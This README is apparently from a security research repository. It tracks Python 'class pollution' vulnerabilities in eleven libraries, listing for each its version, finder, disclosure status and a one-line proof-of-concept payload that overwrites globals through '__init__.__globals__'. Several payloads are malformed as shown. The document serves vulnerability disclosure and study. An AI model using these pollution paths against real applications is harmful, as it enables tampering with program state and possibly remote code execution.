## Python Class Pollution Vulnerability and its Gadgets

> The Python World-Class Pollution: Understanding the New Python Prototype Pollution Vulnerability and its Consequnces

This repository contains a list of packages that are vulnerable to class pollution (i.e., prototype pollution in Python) and class pollution gadgets that can result in severe issues like RCE.

| Library | Type | Stars | Version | Payloads | Found By | Status | CVE | Exploitability |
|:-------:|:----:|:-----:|:-------:|----------|:--------:|:------:|:---:|:--------------:|
| [pyinstrument](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pyinstrument/README.md) | Lib | 6.8K | N/A | ```pyinstrument.vendor.keypath.set_value_at_keypath(obj, '__class__.__init__.__globals__.__name__', 'polluted')``` | BlackPyrl | Pending | N/A | Low|
| [clearml](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/clearml/README.md) | App | 5.7K | v1.16.5 | ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr''polluted'})``` | BlackPyrl | Pending | N/A | Low|
| [Mesop](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/mesop/README.md) | App | 5.7K | v0.13.0 | ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__"{"__globals__"{"__name__""polluted"}}}')``` | BlackPyrl | Pending | N/A | High|
| [IssacLab](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/issaclab/README.md) | Lib | 2.5K | v1.4.0 | ```omni.isaac.lab.utils.dict.update_class_from_dict(obj, {'__init__':{'__globals__':{'__name__':"polluted"}}})``` | BlackPyrl | Pending | N/A | Low|
| [deepdiff](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/deepdiff/README.md) | Lib | 2K | v8.0.0 | ```{"attribute_added" {"root['x']"namedtuple, "root['x'].'__globals__'['_sys'].'__name__'""polluted"}}``` | chilaxan | Accepted | CVE-2024-5254 | High|
| [glom](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/glom/README.md) | Lib | 1.9K | v24.11.0 | ```glom.assign(obj, '__init__.__globals__.__name__', 'polluted')``` | BlackPyrl | Pending | N/A | High|
| [pydash](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pydash/README.md) | Lib | 1.3K | v5.1.2 | ```pydash.set_(obj1, '__init__.__globals__.__name__', "polluted")``` | abdulrah33m | Fixed | N/A | High|
| [OpenVINO™ Training Extensions](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/otx/README.md) | Lib | 1.2K | v2.2.2 | ```otx.engine.hpo.hpo_trial.set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)``` | BlackPyrl | Pending | N/A | Low|
| [torchlens](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/torchlens/README.md) | Lib | 530 | 0.1.26 | ```torchlens.nested_assign(obj, [("attr", "__init__"), ("attr", "__globals__"), ("ind", "__name__") ], 'polluted')``` | Zhong | Pending | N/A | Low|
| [pystringattr](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pystringattr/README.md) | Lib | 2 | N/A | ```pystringattr.setstrattr(obj, '__init__.__globals__["__name__"]', 'polluted')``` | Zhong | Pending | N/A | High|
| [magicattr](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/magicattr/README.md) | Lib | 17 | v3.9.0 | ```magicattr.set(bob, '__class__.__init__.__globals__["__name__"]', "polluted")``` | BlackPyrl | Pending | N/A | High|
